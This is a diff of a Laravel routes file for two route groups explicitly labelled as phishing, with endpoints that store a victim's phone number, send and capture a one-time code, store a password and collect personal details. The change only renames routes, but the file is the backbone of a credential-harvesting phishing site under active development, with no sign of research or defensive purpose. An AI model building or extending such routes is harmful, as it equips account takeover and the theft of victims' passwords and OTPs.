@@ -25,9 +25,9 @@ Route::post('store_password', [Phising1Controller::class, 'store_password'])->na
 
 
 // PHISING 2
-Route::get('one', [Phising2Controller::class, 'index'])->name('home');
-Route::post('one/store-number', [Phising2Controller::class, 'store_number'])->name('store_number');
-Route::post('one/send-otp', [Phising2Controller::class, 'send_otp'])->name('send_otp');
-Route::post('one/store_password', [Phising2Controller::class, 'store_password'])->name('store_password');
+Route::get('one', [Phising2Controller::class, 'index'])->name('one.home');
+Route::post('one/store-number', [Phising2Controller::class, 'store_number'])->name('one.store_number');
+Route::post('one/send-otp', [Phising2Controller::class, 'send_otp'])->name('one.send_otp');
+Route::post('one/store_password', [Phising2Controller::class, 'store_password'])->name('one.store_password');
 
 Route::get('data-diri', [Phising1Controller::class, 'data-diri'])->name('data_diri');
